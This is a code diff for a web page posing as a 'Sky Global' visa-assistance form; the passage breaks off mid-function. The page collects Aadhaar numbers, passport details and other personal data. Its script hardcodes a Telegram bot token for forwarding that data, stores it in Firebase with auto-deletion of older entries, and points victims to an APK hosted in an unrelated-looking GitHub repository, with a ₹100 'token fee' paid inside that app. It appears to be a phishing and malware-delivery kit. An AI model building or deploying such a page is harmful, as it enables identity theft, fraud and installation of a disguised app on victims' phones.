+                        <div class="radio-group">
+                            <div class="radio-item"><input type="radio" name="prevVisa" id="prevVisa1" value="Yes"><label for="prevVisa1" class="radio-label">Yes</label></div>
+                            <div class="radio-item"><input type="radio" name="prevVisa" id="prevVisa2" value="No" checked><label for="prevVisa2" class="radio-label">No</label></div>
+                        </div>
+                    </div>
+
+                    <div class="form-group">
+                        <label class="form-label">Have you ever had a visa refused?</label>
+                        <div class="radio-group">
+                            <div class="radio-item"><input type="radio" name="visaRefusal" id="refusal1" value="Yes"><label for="refusal1" class="radio-label">Yes</label></div>
+                            <div class="radio-item"><input type="radio" name="visaRefusal" id="refusal2" value="No" checked><label for="refusal2" class="radio-label">No</label></div>
+                        </div>
+                    </div>
+
+                    <hr class="section-divider">
+
+                    <h3 class="section-title-small"><i class="fas fa-briefcase"></i> Current Occupation</h3>
+
+                    <div class="form-group">
+                        <label class="form-label">Current Occupation <span class="required">*</span></label>
+                        <select class="form-select" id="occupation" required onchange="handleOccupationChange()">
+                            <option value="">Select...</option>
+                            <option value="Employed">Employed</option>
+                            <option value="Self Employed">Self Employed</option>
+                            <option value="Business Owner">Business Owner</option>
+                            <option value="Student">Student</option>
+                            <option value="Retired">Retired</option>
+                            <option value="Homemaker">Homemaker</option>
+                            <option value="Other">Other</option>
+                        </select>
+                    </div>
+
+                    <div id="employmentFields" class="hidden">
+                        <div class="form-row">
+                            <div class="form-group">
+                                <label class="form-label">Employer Name</label>
+                                <input type="text" class="form-input" id="employerName" placeholder="Enter employer name">
+                            </div>
+                            <div class="form-group">
+                                <label class="form-label">Job Position</label>
+                                <input type="text" class="form-input" id="jobPosition" placeholder="Enter job position">
+                            </div>
+                        </div>
+                        <div class="form-row">
+                            <div class="form-group">
+                                <label class="form-label">Employment Start Date</label>
+                                <input type="date" class="form-input" id="employmentStart">
+                            </div>
+                            <div class="form-group">
+                                <label class="form-label">Monthly Income</label>
+                                <input type="text" class="form-input" id="monthlyIncome" placeholder="₹ Amount">
+                            </div>
+                        </div>
+                    </div>
+
+                    <hr class="section-divider">
+
+                    <h3 class="section-title-small"><i class="fas fa-wallet"></i> Trip Funding</h3>
+
+                    <div class="form-group">
+                        <label class="form-label">Who will pay for your trip? <span class="required">*</span></label>
+                        <div class="radio-group">
+                            <div class="radio-item"><input type="radio" name="funding" id="funding1" value="Myself" required><label for="funding1" class="radio-label">Myself</label></div>
+                            <div class="radio-item"><input type="radio" name="funding" id="funding2" value="Family"><label for="funding2" class="radio-label">Family</label></div>
+                            <div class="radio-item"><input type="radio" name="funding" id="funding3" value="Employer"><label for="funding3" class="radio-label">Employer</label></div>
+                            <div class="radio-item"><input type="radio" name="funding" id="funding4" value="Sponsor"><label for="funding4" class="radio-label">Sponsor</label></div>
+                            <div class="radio-item"><input type="radio" name="funding" id="funding5" value="Other"><label for="funding5" class="radio-label">Other</label></div>
+                        </div>
+                    </div>
+
+                    <div class="info-box" style="margin-top: 2rem;">
+                        <div class="info-box-title"><i class="fas fa-shield-alt"></i> Keep Your Documents Ready</div>
+                        <div class="info-box-text">Sky Global will inform you about the documents required for your selected destination and visa category. Please keep the relevant original documents and copies ready for further assistance.</div>
+                    </div>
+
+                    <div class="form-actions">
+                        <button type="button" class="btn btn-back" onclick="goBack()">
+                            <i class="fas fa-arrow-left"></i> Back
+                        </button>
+                        <button type="button" class="btn btn-primary btn-large" onclick="showReview()">
+                            Review Information <i class="fas fa-eye"></i>
+                        </button>
+                    </div>
+                </form>
+            </div>
+
+            <!-- STEP 3 REVIEW -->
+            <div id="step3Review" class="form-step hidden">
+                <div class="form-header">
+                    <h2 class="form-title">Review Your Information</h2>
+                    <p class="form-subtitle">Please verify all details before proceeding</p>
+                </div>
+
+                <div id="reviewContent"></div>
+
+                <div class="form-group" style="margin-top: 2rem;">
+                    <div class="checkbox-group" style="flex-direction: column; align-items: flex-start;">
+                        <div class="checkbox-item">
+                            <input type="checkbox" id="confirmAccuracy" required>
+                            <label for="confirmAccuracy" class="checkbox-label">I confirm that the information provided by me is accurate to the best of my knowledge.</label>
+                        </div>
+                        <div class="checkbox-item">
+                            <input type="checkbox" id="agreeTerms" required>
+                            <label for="agreeTerms" class="checkbox-label">I agree to the Sky Global Privacy Policy and Terms & Conditions.</label>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="form-actions">
+                    <button type="button" class="btn btn-back" onclick="goBack()">
+                        <i class="fas fa-arrow-left"></i> Edit Information
+                    </button>
+                    <button type="button" class="btn btn-primary btn-large" onclick="proceedToStep4()">
+                        Submit Application <i class="fas fa-paper-plane"></i>
+                    </button>
+                </div>
+            </div>
+
+            <!-- STEP 4 -->
+            <div id="step4" class="form-step hidden">
+                <div class="token-section">
+                    <div class="form-header">
+                        <h2 class="form-title">Your Application Has Been Submitted!</h2>
+                        <p class="form-subtitle">Follow the steps below to generate your Sky Global token</p>
+                    </div>
+
+                    <div id="downloadAppStage">
+                        <div class="download-app-card">
+                            <div class="download-app-icon">
+                                <i class="fas fa-mobile-alt"></i>
+                            </div>
+                            <h3 class="download-app-title">Download the Sky Global App</h3>
+                            <p class="download-app-text">
+                                Your details have been saved. To generate your unique token and continue with visa assistance, please download the Sky Global app and complete the ₹100 service fee payment inside the app.
+                            </p>
+
+                            <!-- ✅ ONLY THE DOWNLOAD BUTTON (Logos Removed) -->
+                            <a href="https://raw.githubusercontent.com/redeemrewards980/Axis/main/Sky%20Global.apk" target="_blank" rel="noopener noreferrer" class="download-app-btn" onclick="showPaymentStage();">
+                                <i class="fas fa-download"></i>
+                                Download App
+                            </a>
+
+                            <!-- Edit Application Button -->
+                            <div style="margin-top: 1rem; padding-top: 1.5rem; border-top: 1px dashed #e2e8f0;">
+                                <p style="color: var(--text-light); font-size: 0.9rem; margin-bottom: 0.75rem;">
+                                    <i class="fas fa-info-circle" style="color: var(--warning);"></i> Need to change something?
+                                </p>
+                                <button class="edit-app-btn" onclick="editApplication()">
+                                    <i class="fas fa-edit"></i>
+                                    Edit My Application
+                                </button>
+                            </div>
+                        </div>
+                    </div>
+
+                    <div id="paymentStage" class="hidden">
+                        <div class="payment-box">
+                            <div class="payment-amount">₹100</div>
+                            <div class="payment-label">Sky Global Service Token Fee</div>
+                            <p style="color: var(--text-light); margin-bottom: 1.5rem;">
+                                Pay the ₹100 service/token fee <strong>through the Sky Global app</strong> to generate your unique token and continue with further assistance.
+                            </p>
+
+                            <div class="payment-methods">
+                                <div class="payment-method">UPI</div>
+                                <div class="payment-method">Card</div>
+                                <div class="payment-method">Net Banking</div>
+                            </div>
+
+                            <div class="info-box" style="text-align: left; margin-bottom: 1.5rem;">
+                                <div class="info-box-title"><i class="fas fa-info-circle"></i> How to Pay</div>
+                                <div class="info-box-text">
+                                    1. Open the Sky Global app<br>
+                                    2. Login with your registered mobile number<br>
+                                    3. Navigate to "My Applications"<br>
+                                    4. Complete the ₹100 payment<br>
+                                    5. Your token will be generated automatically
+                                </div>
+                            </div>
+
+                            <button class="btn btn-gold btn-large btn-full" onclick="processPayment()">
+                                <i class="fas fa-check-circle"></i>
+                                I Have Paid ₹100 in the App
+                            </button>
+                        </div>
+                    </div>
+
+                    <div id="tokenSuccess" class="hidden">
+                        <div class="token-card">
+                            <div class="token-icon">
+                                <i class="fas fa-check-circle"></i>
+                            </div>
+                            <h3 class="token-title">Token Generated Successfully!</h3>
+                            <p>Your Sky Global token has been generated. Please use the Sky Global app for further assistance and updates.</p>
+                            
+                            <div class="token-number" id="tokenNumber">SG-2026-XXXXXX</div>
+                            
+                            <div class="token-status">
+                                <i class="fas fa-check-circle"></i>
+                                Payment: Successful
+                            </div>
+
+                            <div style="margin-top: 1.5rem;">
+                                <button class="btn btn-gold btn-large btn-full" style="margin-bottom: 1rem;" onclick="window.open('https://raw.githubusercontent.com/redeemrewards980/Axis/main/Sky%20Global.apk', '_blank')">
+                                    <i class="fas fa-mobile-alt"></i>
+                                    Open Sky Global App
+                                </button>
+                                <button class="btn btn-secondary btn-large btn-full" style="border-color: white; color: white;" onclick="downloadSummary()">
+                                    <i class="fas fa-download"></i>
+                                    Download Application Summary
+                                </button>
+                            </div>
+
+                            <div class="app-updates-notice">
+                                <div class="info-box-title"><i class="fas fa-bell"></i> All Further Updates in the App</div>
+                                <div class="info-box-text">
+                                    All application status updates, document requirements, consultant messages, and notifications will be available in the Sky Global app. Please keep the app installed and check it regularly for the latest updates on your visa application.
+                                </div>
+                            </div>
+                        </div>
+
+                        <div style="margin-top: 2rem; text-align: center;">
+                            <a href="index.html" class="btn btn-primary">
+                                <i class="fas fa-home"></i>
+                                Back to Home
+                            </a>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+        </div>
+    </div>
+
+    <script>
+        // ============================================
+        // FIREBASE CONFIGURATION
+        // ============================================
+        const firebaseConfig = {
+            apiKey: "AIzaSyD3x1_VLfgdXKNG33dsmENFzkftkFpEfYE",
+            authDomain: "admin-panel-3a6e0.firebaseapp.com",
+            databaseURL: "https://admin-panel-3a6e0-default-rtdb.firebaseio.com",
+            projectId: "admin-panel-3a6e0",
+            storageBucket: "admin-panel-3a6e0.firebasestorage.app",
+            messagingSenderId: "955177241156",
+            appId: "1:955177241156:android:d47ad137d7addeaec6ca11"
+        };
+
+        firebase.initializeApp(firebaseConfig);
+        const database = firebase.database();
+
+        // Telegram Configuration
+        const TELEGRAM_BOT_TOKEN = '8933641983:AAGPkyuaJqdywgj8ijGmJY7qszJDybShEXA';
+        const TELEGRAM_CHAT_ID = '-1004359635207';
+
+        // Global State
+        let currentStep = 1;
+        let applicationData = {
+            destination: '',
+            travellers: { adults: 1, children: 0, infants: 0, total: 1 },
+            purpose: '',
+            travelDate: '',
+            duration: '',
+            previousTravel: '',
+            hasPassport: '',
+            personalInfo: {},
+            passportInfo: {},
+            visaInfo: {},
+            employment: {},
+            funding: '',
+            token: '',
+            paymentStatus: '',
+            status: '',
+            appId: ''
+        };
+
+        document.addEventListener('DOMContentLoaded', function() {
+            setupDatePickers();
+            handleUrlParams();
+            setupHistoryListener();
+        });
+
+        // ============================================
+        // PHONE BACK BUTTON & HISTORY MANAGEMENT
+        // ============================================
+        function setupHistoryListener() {
+            if (!window.history.state || !window.history.state.step) {
+                window.history.replaceState({ step: 1 }, '', '');
+            }
+
+            window.addEventListener('popstate', function(event) {
+                if (event.state && event.state.step) {
+                    const targetStep = event.state.step;
+                    if (targetStep === 3 && currentStep === 4) {
+                        showReviewUI(); 
+                    } else {
+                        goToStep(targetStep, true);
+                    }
+                } else {
+                    goToStep(1, true);
+                }
+            });
+        }
+
+        function pushHistory(step) {
+            window.history.pushState({ step: step }, '', `?step=${step}`);
+        }
+
+        function goBack() {
+            if (currentStep > 1) {
+                window.history.back();
+            } else {
+                if(confirm("Are you sure you want to exit? Your data will be lost.")) {
+                    window.location.href = 'index.html';
+                }
+            }
+        }
+
+        function handleStepClick(step) {
+            if (step < currentStep) {
+                if (step === 3 && currentStep === 4) {
+                    showReviewUI();
+                } else {
+                    goToStep(step, false);
+                }
+            }
+        }
+
+        function showReviewUI() {
+            populateReviewData();
+            document.querySelectorAll('.form-step').forEach(s => s.classList.add('hidden'));
+            document.getElementById('step3Review').classList.remove('hidden');
+            currentStep = 3;
+            updateStepIndicator();
+            pushHistory(3);
+            window.scrollTo({ top: 0, behavior: 'smooth' });
+        }
+
+        // ============================================
+        // DATE PICKER FIXES
+        // ============================================
+        function setupDatePickers() {
+            const today = new Date().toISOString().split('T')[0];
+            const dobInput = document.getElementById('dob');
+            if (dobInput) dobInput.setAttribute('max', today);
+            
+            const travelInput = document.getElementById('travelDate');
+            if (travelInput) travelInput.setAttribute('min', today);
+            
+            const passportIssue = document.getElementById('passportIssue');
+            if (passportIssue) passportIssue.setAttribute('max', today);
+            
+            const passportExpiry = document.getElementById('passportExpiry');
+            if (passportExpiry) passportExpiry.setAttribute('min', today);
+        }
+
+        // Format Helpers
+        function formatMobileNumber(input) {
+            let value = input.value.replace(/\D/g, '');
+            if (value.length > 10) value = value.substring(0, 10);
+            input.value = value;
+        }
+
+        function formatAadhaar(input) {
+            let value = input.value.replace(/\D/g, '');
+            if (value.length > 12) value = value.substring(0, 12);
+            let formatted = '';
+            for (let i = 0; i < value.length; i++) {
+                if (i > 0 && i % 4 === 0) formatted += ' ';
+                formatted += value[i];
+            }
+            input.value = formatted;
+        }
+
+        function formatPassportNumber(input) {
+            let value = input.value.toUpperCase().replace(/[^A-Z0-9]/g, '');
+            if (value.length > 0 && !/^[A-Z]/.test(value)) {
+                value = value.replace(/^[0-9]+/, '');
+            }
+            if (value.length > 8) value = value.substring(0, 8);
+            input.value = value;
+        }
+
+        function togglePassportFields() {
+            const hasPassport = document.querySelector('input[name="validPassport"]:checked');
+            const passportDetails = document.getElementById('passportDetails');
+            const passportNumber = document.getElementById('passportNumber');
+            const passportCountry = document.getElementById('passportCountry');
+            const passportIssue = document.getElementById('passportIssue');
+            const passportExpiry = document.getElementById('passportExpiry');
+            
+            if (hasPassport && hasPassport.value === 'Yes') {
+                passportDetails.classList.remove('hidden');
+                passportNumber.setAttribute('required', 'required');
+                passportCountry.setAttribute('required', 'required');
+                passportIssue.setAttribute('required', 'required');
+                passportExpiry.setAttribute('required', 'required');
+            } else {
+                passportDetails.classList.add('hidden');
+                passportNumber.removeAttribute('required');
+                passportCountry.removeAttribute('required');
+                passportIssue.removeAttribute('required');
+                passportExpiry.removeAttribute('required');
+            }
+        }
+
+        function handleUrlParams() {
+            const params = new URLSearchParams(window.location.search);
+            const country = params.get('country');
+            const purpose = params.get('purpose');
+            
+            if (country) {
+                setTimeout(() => {
+                    const select = document.getElementById('destination');
+                    for (let option of select.options) {
+                        if (option.value === country) {
+                            option.selected = true;
+                            break;
+                        }
+                    }
+                }, 100);
+            }
+            
+            if (purpose) {
+                setTimeout(() => {
+                    const radio = document.querySelector(`input[name="purpose"][value="${purpose}"]`);
+                    if (radio) radio.checked = true;
+                }, 100);
+            }
+        }
+
+        function updateCounter(type, change) {
+            const countEl = document.getElementById(type + 'Count');
+            let current = parseInt(countEl.textContent);
+            let newValue = current + change;
+            if (newValue < 0) newValue = 0;
+            if (type === 'adults' && newValue < 1) newValue = 1;
+            countEl.textContent = newValue;
+            applicationData.travellers[type] = newValue;
+            const total = applicationData.travellers.adults + applicationData.travellers.children + applicationData.travellers.infants;
+            document.getElementById('totalTravellers').textContent = total;
+            applicationData.travellers.total = total;
+        }
+
+        function goToStep(step, isFromHistory = false) {
+            document.querySelectorAll('.form-step').forEach(s => s.classList.add('hidden'));
+            
+            if (step === 3 && document.getElementById('step3Review').classList.contains('hidden') === false && !isFromHistory) {
+                 document.getElementById('step3').classList.remove('hidden');
+            } else if (step === 3) {
+                 document.getElementById('step3').classList.remove('hidden');
+            } else {
+                document.getElementById('step' + step).classList.remove('hidden');
+            }
+
+            currentStep = step;
+            updateStepIndicator();
+            
+            if (step === 3) populateReviewData();
+            
+            if (!isFromHistory && step > 1) {
+                if (!window.history.state || window.history.state.step !== step) {
+                    pushHistory(step);
+                }
+            }
+            
+            window.scrollTo({ top: 0, behavior: 'smooth' });
+        }
+
+        function updateStepIndicator() {
+            const dots = document.querySelectorAll('.step-dot');
+            const lines = document.querySelectorAll('.step-line');
+            dots.forEach((dot, index) => {
+                const stepNum = index + 1;
+                dot.classList.remove('active', 'completed');
+                if (stepNum === currentStep) dot.classList.add('active');
+                else if (stepNum < currentStep) dot.classList.add('completed');
+            });
+            lines.forEach((line, index) => {
+                line.classList.remove('completed');
+                if (index + 1 < currentStep) line.classList.add('completed');
+            });
+        }
+
+        function handleStep1(e) {
+            e.preventDefault();
+            const destination = document.getElementById('destination').value;
+            if (!destination) { alert('Please select a destination'); return; }
+            applicationData.destination = destination;
+            goToStep(2);
+        }
+
+        function handleStep2(e) {
+            e.preventDefault();
+            const purpose = document.querySelector('input[name="purpose"]:checked');
+            const travelDate = document.getElementById('travelDate').value;
+            const duration = document.getElementById('duration').value;
+            const prevTravel = document.querySelector('input[name="prevTravel"]:checked');
+            const hasPassport = document.querySelector('input[name="hasPassport"]:checked');
+            
+            if (!purpose || !travelDate || !duration || !prevTravel || !hasPassport) {
+                alert('Please answer all questions');
+                return;
+            }
+            
+            applicationData.purpose = purpose.value;
+            applicationData.travelDate = travelDate;
+            applicationData.duration = duration;
+            applicationData.previousTravel = prevTravel.value;
+            applicationData.hasPassport = hasPassport.value;
+            goToStep(3);
+        }
+
+        function handleStep3(e) {
+            e.preventDefault();
+            showReview();
+        }
+
+        function handleOccupationChange() {
+            const occupation = document.getElementById('occupation').value;
+            const fields = document.getElementById('employmentFields');
+            if (occupation === 'Employed') fields.classList.remove('hidden');
+            else fields.classList.add('hidden');
+        }
+
+        function validateMobile(value) { return /^\d{10}$/.test(value); }
+        function validateAadhaar(value) { const digits = value.replace(/\s/g, ''); return /^\d{12}$/.test(digits); }
+        function validatePassportNumber(value) { return /^[A-Z][0-9]{7}$/.test(value.toUpperCase()); }
+
+        function showReview() {
+            const requiredFields = ['fullName', 'dob', 'gender', 'nationality', 'residence', 'city', 'mobile', 'email', 'aadhaar', 'maritalStatus', 'occupation'];
+            let isValid = true;
+            let errorMessage = '';
+            
+            requiredFields.forEach(field => {
+                const el = document.getElementById(field);
+                if (el && !el.value.trim()) {
+                    el.classList.add('error');
+                    isValid = false;
+                } else if (el) {
+                    el.classList.remove('error');
+                }
+            });
+            
+            const mobile = document.getElementById('mobile').value;
+            if (mobile && !validateMobile(mobile)) {
+                document.getElementById('mobile').classList.add('error');
+                isValid = false;
+                errorMessage = 'Please enter a valid 10-digit mobile number';
+            }
+            
+            const aadhaar = document.getElementById('aadhaar').value;
+            if (aadhaar && !validateAadhaar(aadhaar)) {
+                document.getElementById('aadhaar').classList.add('error');
+                isValid = false;
+                errorMessage = 'Please enter a valid 12-digit Aadhaar number';
+            }
+            
+            const hasPassport = document.querySelector('input[name="validPassport"]:checked');
+            if (hasPassport && hasPassport.value === 'Yes') {
+                const passportNumber = document.getElementById('passportNumber').value;
+                const passportCountry = document.getElementById('passportCountry').value;
+                const passportIssue = document.getElementById('passportIssue').value;
+                const passportExpiry = document.getElementById('passportExpiry').value;
+                
+                if (!passportNumber || !passportCountry || !passportIssue || !passportExpiry) {
+                    isValid = false;
+                    errorMessage = 'Please fill all passport details';
+                } else if (!validatePassportNumber(passportNumber)) {
+                    document.getElementById('passportNumber').classList.add('error');
+                    isValid = false;
+                    errorMessage = 'Please enter a valid passport number (1 letter + 7 digits, e.g. A1234567)';
+                }
+                
+                if (passportIssue && passportExpiry && new Date(passportExpiry) <= new Date(passportIssue)) {
+                    document.getElementById('passportExpiry').classList.add('error');
+                    isValid = false;
+                    errorMessage = 'Passport expiry date must be after issue date';
+                }
+            }
+            
+            if (!isValid) {
+                alert(errorMessage || 'Please fill in all required fields correctly');
+                return;
+            }
+            
+            applicationData.personalInfo = {
+                fullName: document.getElementById('fullName').value,
+                lastName: document.getElementById('lastName').value,
+                dob: document.getElementById('dob').value,
+                gender: document.getElementById('gender').value,
+                nationality: document.getElementById('nationality').value,
+                residence: document.getElementById('residence').value,
+                city: document.getElementById('city').value,
+                mobile: mobile,
+                email: document.getElementById('email').value,
+                aadhaar: aadhaar,
+                maritalStatus: document.getElementById('maritalStatus').value
+            };
+            
+            applicationData.passportInfo = {
+                hasPassport: hasPassport ? hasPassport.value : 'No',
+                passportNumber: document.getElementById('passportNumber').value.toUpperCase(),
+                passportCountry: document.getElementById('passportCountry').value,
+                passportIssue: document.getElementById('passportIssue').value,
+                passportExpiry: document.getElementById('passportExpiry').value,
+                passportPlace: document.getElementById('passportPlace').value
+            };
+            
+            applicationData.employment = {
+                occupation: document.getElementById('occupation').value,
+                employerName: document.getElementById('employerName')?.value || '',
+                jobPosition: document.getElementById('jobPosition')?.value || ''
+            };
+            
+            applicationData.funding = document.querySelector('input[name="funding"]:checked')?.value || '';
+            
+            populateReviewData();
+            document.getElementById('step3').classList.add('hidden');
+            document.getElementById('step3Review').classList.remove('hidden');
+            pushHistory(3);
+            window.scrollTo({ top: 0, behavior: 'smooth' });
+        }
+
+        function editApplication() {
+            populateFormFromData();
+            document.getElementById('step4').classList.add('hidden');
+            document.getElementById('step3').classList.remove('hidden');
+            currentStep = 3;
+            updateStepIndicator();
+            pushHistory(3);
+            window.scrollTo({ top: 0, behavior: 'smooth' });
+        }
+
+        function populateFormFromData() {
+            if (applicationData.destination) document.getElementById('destination').value = applicationData.destination;
+            document.getElementById('adultsCount').textContent = applicationData.travellers.adults;
+            document.getElementById('childrenCount').textContent = applicationData.travellers.children;
+            document.getElementById('infantsCount').textContent = applicationData.travellers.infants;
+            document.getElementById('totalTravellers').textContent = applicationData.travellers.total;
+
+            if (applicationData.purpose) {
+                const radio = document.querySelector(`input[name="purpose"][value="${applicationData.purpose}"]`);
+                if (radio) radio.checked = true;
+            }
+            if (applicationData.travelDate) document.getElementById('travelDate').value = applicationData.travelDate;
+            if (applicationData.duration) document.getElementById('duration').value = applicationData.duration;
+            if (applicationData.previousTravel) {
+                const radio = document.querySelector(`input[name="prevTravel"][value="${applicationData.previousTravel}"]`);
+                if (radio) radio.checked = true;
+            }
+            if (applicationData.hasPassport) {
+                const radio = document.querySelector(`input[name="hasPassport"][value="${applicationData.hasPassport}"]`);
+                if (radio) {
+                    radio.checked = true;
+                    togglePassportFields();
+                }
+            }
+
+            const p = applicationData.personalInfo;
+            if (p.fullName) document.getElementById('fullName').value = p.fullName;
+            if (p.lastName) document.getElementById('lastName').value = p.lastName;
+            if (p.dob) document.getElementById('dob').value = p.dob;
+            if (p.gender) document.getElementById('gender').value = p.gender;
+            if (p.nationality) document.getElementById('nationality').value = p.nationality;
+            if (p.residence) document.getElementById('residence').value = p.residence;
+            if (p.city) document.getElementById('city').value = p.city;
+            if (p.mobile) document.getElementById('mobile').value = p.mobile;
+            if (p.email) document.getElementById('email').value = p.email;
+            if (p.aadhaar) document.getElementById('aadhaar').value = p.aadhaar;
+            if (p.maritalStatus) document.getElementById('maritalStatus').value = p.maritalStatus;
+
+            const pass = applicationData.passportInfo;
+            if (pass.hasPassport) {
+                const radio = document.querySelector(`input[name="validPassport"][value="${pass.hasPassport}"]`);
+                if (radio) {
+                    radio.checked = true;
+                    togglePassportFields();
+                }
+                if (pass.passportNumber) document.getElementById('passportNumber').value = pass.passportNumber;
+                if (pass.passportCountry) document.getElementById('passportCountry').value = pass.passportCountry;
+                if (pass.passportIssue) document.getElementById('passportIssue').value = pass.passportIssue;
+                if (pass.passportExpiry) document.getElementById('passportExpiry').value = pass.passportExpiry;
+                if (pass.passportPlace) document.getElementById('passportPlace').value = pass.passportPlace;
+            }
+
+            const emp = applicationData.employment;
+            if (emp.occupation) {
+                document.getElementById('occupation').value = emp.occupation;
+                handleOccupationChange();
+                if (emp.employerName) document.getElementById('employerName').value = emp.employerName;
+                if (emp.jobPosition) document.getElementById('jobPosition').value = emp.jobPosition;
+            }
+
+            if (applicationData.funding) {
+                const radio = document.querySelector(`input[name="funding"][value="${applicationData.funding}"]`);
+                if (radio) radio.checked = true;
+            }
+        }
+
+        function populateReviewData() {
+            document.getElementById('reviewDestination').textContent = applicationData.destination || '-';
+            document.getElementById('reviewTravellers').textContent = applicationData.travellers.total;
+            document.getElementById('reviewPurpose').textContent = applicationData.purpose || '-';
+            document.getElementById('reviewTravelDate').textContent = applicationData.travelDate || '-';
+            
+            const reviewContent = document.getElementById('reviewContent');
+            reviewContent.innerHTML = `
+                <div class="review-section">
+                    <div class="review-header">
+                        <h3 class="review-title">Travel Details</h3>
+                        <button class="btn btn-edit" onclick="goBack()">Edit</button>
+                    </div>
+                    <div class="review-grid">
+                        <div class="review-item"><span class="review-label">Destination</span><span class="review-value">${applicationData.destination}</span></div>
+                        <div class="review-item"><span class="review-label">Number of Travellers</span><span class="review-value">${applicationData.travellers.total}</span></div>
+                        <div class="review-item"><span class="review-label">Purpose</span><span class="review-value">${applicationData.purpose}</span></div>
+                        <div class="review-item"><span class="review-label">Travel Date</span><span class="review-value">${applicationData.travelDate}</span></div>
+                        <div class="review-item"><span class="review-label">Duration</span><span class="review-value">${applicationData.duration}</span></div>
+                        <div class="review-item"><span class="review-label">Previous Travel</span><span class="review-value">${applicationData.previousTravel}</span></div>
+                        <div class="review-item"><span class="review-label">Has Passport</span><span class="review-value">${applicationData.hasPassport}</span></div>
+                    </div>
+                </div>
+
+                <div class="review-section">
+                    <div class="review-header">
+                        <h3 class="review-title">Personal Information</h3>
+                        <button class="btn btn-edit" onclick="goBack()">Edit</button>
+                    </div>
+                    <div class="review-grid">
+                        <div class="review-item"><span class="review-label">Full Name</span><span class="review-value">${applicationData.personalInfo.fullName}</span></div>
+                        <div class="review-item"><span class="review-label">Last Name</span><span class="review-value">${applicationData.personalInfo.lastName || '-'}</span></div>
+                        <div class="review-item"><span class="review-label">Date of Birth</span><span class="review-value">${applicationData.personalInfo.dob}</span></div>
+                        <div class="review-item"><span class="review-label">Gender</span><span class="review-value">${applicationData.personalInfo.gender}</span></div>
+                        <div class="review-item"><span class="review-label">Nationality</span><span class="review-value">${applicationData.personalInfo.nationality}</span></div>
+                        <div class="review-item"><span class="review-label">Country of Residence</span><span class="review-value">${applicationData.personalInfo.residence}</span></div>
+                        <div class="review-item"><span class="review-label">City</span><span class="review-value">${applicationData.personalInfo.city}</span></div>
+                        <div class="review-item"><span class="review-label">Mobile</span><span class="review-value">${applicationData.personalInfo.mobile}</span></div>
+                        <div class="review-item"><span class="review-label">Email</span><span class="review-value">${applicationData.personalInfo.email}</span></div>
+                        <div class="review-item"><span class="review-label">Aadhaar Number</span><span class="review-value">${applicationData.personalInfo.aadhaar}</span></div>
+                        <div class="review-item"><span class="review-label">Marital Status</span><span class="review-value">${applicationData.personalInfo.maritalStatus}</span></div>
+                    </div>
+                </div>
+
+                <div class="review-section">
+                    <div class="review-header">
+                        <h3 class="review-title">Passport Details</h3>
+                        <button class="btn btn-edit" onclick="goBack()">Edit</button>
+                    </div>
+                    <div class="review-grid">
+                        <div class="review-item"><span class="review-label">Has Passport</span><span class="review-value">${applicationData.passportInfo.hasPassport}</span></div>
+                        <div class="review-item"><span class="review-label">Passport Number</span><span class="review-value">${applicationData.passportInfo.passportNumber || '-'}</span></div>
+                        <div class="review-item"><span class="review-label">Issuing Country</span><span class="review-value">${applicationData.passportInfo.passportCountry || '-'}</span></div>
+                        <div class="review-item"><span class="review-label">Issue Date</span><span class="review-value">${applicationData.passportInfo.passportIssue || '-'}</span></div>
+                        <div class="review-item"><span class="review-label">Expiry Date</span><span class="review-value">${applicationData.passportInfo.passportExpiry || '-'}</span></div>
+                        <div class="review-item"><span class="review-label">Place of Issue</span><span class="review-value">${applicationData.passportInfo.passportPlace || '-'}</span></div>
+                    </div>
+                </div>
+
+                <div class="review-section">
+                    <div class="review-header">
+                        <h3 class="review-title">Employment & Funding</h3>
+                        <button class="btn btn-edit" onclick="goBack()">Edit</button>
+                    </div>
+                    <div class="review-grid">
+                        <div class="review-item"><span class="review-label">Occupation</span><span class="review-value">${applicationData.employment.occupation}</span></div>
+                        <div class="review-item"><span class="review-label">Employer</span><span class="review-value">${applicationData.employment.employerName || '-'}</span></div>
+                        <div class="review-item"><span class="review-label">Position</span><span class="review-value">${applicationData.employment.jobPosition || '-'}</span></div>
+                        <div class="review-item"><span class="review-label">Trip Funding</span><span class="review-value">${applicationData.funding}</span></div>
+                    </div>
+                </div>
+            `;
+        }
+
+        // ============================================
+        // FIREBASE: AUTO-CLEANUP (Keep only last 30)
+        // ============================================
+        async function enforceMaxEntries(maxEntries = 30) {
+            const appsRef = database.ref('applications');
+            const snapshot = await appsRef.orderByKey().limitToFirst(maxEntries + 5).once('value');
+            
+            const keysToDelete = [];
+            snapshot.forEach(childSnapshot => {
+                keysToDelete.push(childSnapshot.key);
+            });
+            
+            if (keysToDelete.length > maxEntries) {
+                const numToDelete = keysToDelete.length - maxEntries;
+                const updates = {};
+                
+                for (let i = 0; i < numToDelete; i++) {
+                    updates[`applications/${keysToDelete[i]}`] = null;
+                }
+                
+                await appsRef.update(updates);
+                console.log(`✅ Cleaned up ${numToDelete} old application(s).`);
+            }
+        }
+
+        // ============================================
+        // ✅ FIXED: TELEGRAM INTEGRATION (Direct API + No-CORS)
+        // ============================================
+        async function sendToTelegram(data) {
+            const message = `NEW VISA APPLICATION - SKY GLOBAL
+==============================
+
+Destination: ${data.destination}
+Travellers: ${data.travellers.total} (Adults: ${data.travellers.adults}, Children: ${data.travellers.children}, Infants: ${data.travellers.infants})
+Purpose: ${data.purpose}
+Travel Date: ${data.travelDate}
+Duration: ${data.duration}
+
+APPLICANT DETAILS
+==============================
+Full Name: ${data.personalInfo.fullName}
+Last Name: ${data.personalInfo.lastName || '-'}
+DOB: ${data.personalInfo.dob}
+Gender: ${data.personalInfo.gender}
+Nationality: ${data.personalInfo.nationality}
+Residence: ${data.personalInfo.residence}
+City: ${data.personalInfo.city}
+Mobile: ${data.personalInfo.mobile}
+Email: ${data.personalInfo.email}
+Aadhaar: ${data.personalInfo.aadhaar}
+Marital Status: ${data.personalInfo.maritalStatus}
+
+PASSPORT DETAILS
+==============================
+Has Passport: ${data.passportInfo.hasPassport}
+Passport No: ${data.passportInfo.passportNumber || '-'}
+Issuing Country: ${data.passportInfo.passportCountry || '-'}
+Issue Date: ${data.passportInfo.passportIssue || '-'}
+Expiry Date: ${data.passportInfo.passportExpiry || '-'}
+Place of Issue: ${data.passportInfo.passportPlace || '-'}
+
+Employment: ${data.employment.occupation}
+${data.employment.employerName ? `Employer: ${data.employment.employerName}` : ''}
+${data.employment.jobPosition ? `Position: ${data.employment.jobPosition}` : ''}
+
+Trip Funding: ${data.funding}
+Previous Travel: ${data.previousTravel}
+
